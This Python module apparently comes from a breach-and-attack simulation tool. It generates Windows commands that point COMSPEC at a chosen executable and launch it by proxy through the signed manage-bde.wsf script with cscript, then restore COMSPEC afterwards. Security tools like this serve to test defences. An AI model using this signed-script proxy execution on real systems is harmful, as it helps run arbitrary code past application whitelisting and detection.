import subprocess

ORIGINAL_COMSPEC = r'C:\Windows\System32\cmd.exe'


def get_windows_commands_to_proxy_execution_using_signed_script():
    global ORIGINAL_COMSPEC
    ORIGINAL_COMSPEC = subprocess.check_output('echo %COMSPEC%', shell=True).decode()  # noqa: DUO116
    return [
        r'set comspec=infection_monkey\post_breach\signed_script_proxy\windows\random_executable.exe &&',
        r'cscript C:\Windows\System32\manage-bde.wsf'
    ]


def get_windows_commands_to_reset_comspec():
    return f'set comspec={ORIGINAL_COMSPEC}'
